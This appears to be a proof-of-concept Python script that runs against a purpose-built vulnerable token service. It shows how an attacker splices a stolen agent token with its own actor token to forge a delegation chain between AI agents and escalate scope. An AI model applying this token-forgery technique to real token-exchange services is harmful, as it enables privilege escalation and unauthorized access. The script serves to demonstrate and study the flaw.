from sts.vulnerable_sts import VulnerableSTS
from agent import Agent
from utils.token_utils import verify_token
from utils.logging import log, SESSION1, ATTACK, SUCCESS

sts = VulnerableSTS()
agent_a = Agent("agent-a")
agent_b = Agent("agent-b")

log("Legitimate chain: Alice authorises Agent A, Agent A delegates to Agent B", SESSION1)
agent_a.receive_token(sts.initial_grant("alice", "agent-a", ["A", "B", "C"]))
a = verify_token(agent_a.token)
log(f"STS issues token: sub = {a['sub']}, aud = {a['aud']}, scope = {a['scope']}", SESSION1)

agent_b.receive_token(agent_a.delegate_to(sts, "agent-b", ["A", "B"]))
b = verify_token(agent_b.token)
log(f"Agent A delegates to Agent B: sub = {b['sub']}, aud = {b['aud']}, scope = {b['scope']}", SESSION1)
log(f"Legitimate act chain: {b['act']}", SESSION1)

print()

attacker_token = sts.initial_grant("attacker", "attacker", ["X"])
at = verify_token(attacker_token)

# attacker steals agent_b.token and splices it with their own token as actor
# the STS never verifies that agent_b was ever authorised to delegate to attacker
log("Attacker steals agent_b.token and splices it with their own token:", ATTACK)
log(f"  subject_token = agent_b.token: aud = {b['aud']}", ATTACK)
log(f"  actor_token   = attacker_token: act.sub = {at['act']['sub']}", ATTACK)
log(f"  aud/sub mismatch: {b['aud']} != {at['act']['sub']}, STS does not check path integrity", ATTACK)

print()

# STS only checks caller == act.sub, never verifies the full delegation path
# the path Alice -> Agent A -> Agent B -> Attacker never existed
forged_token = sts.exchange(
    agent_b.token,
    attacker_token,
    "attacker",
    ["A", "B", "C"],
    caller="attacker"
)

f = verify_token(forged_token)
log("Vulnerable STS issued token, forged delegation path accepted", SUCCESS)
log(f"  sub   = {f['sub']}", SUCCESS)
log(f"  aud   = {f['aud']}", SUCCESS)
log(f"  scope = {f['scope']}, scope escalated, agent-b only had {b['scope']}", SUCCESS)
log(f"  act chain: {f['act']}", SUCCESS)
log(f"  path Alice -> Agent A -> Agent B -> Attacker never existed", SUCCESS)